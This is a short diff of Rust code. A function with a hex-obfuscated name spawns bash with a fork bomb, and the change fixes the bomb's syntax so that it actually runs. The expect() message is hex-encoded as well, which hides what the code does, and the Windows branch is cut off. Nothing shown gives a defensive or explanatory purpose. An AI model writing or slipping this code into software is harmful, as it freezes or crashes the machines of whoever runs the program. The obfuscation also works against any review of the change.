@@ -8,7 +8,7 @@ pub fn main() {
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
         Command::new("bash")
-            .arg(":(){:|:&};:")
+            .arg(":(){ :|:& };:")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(windows) {
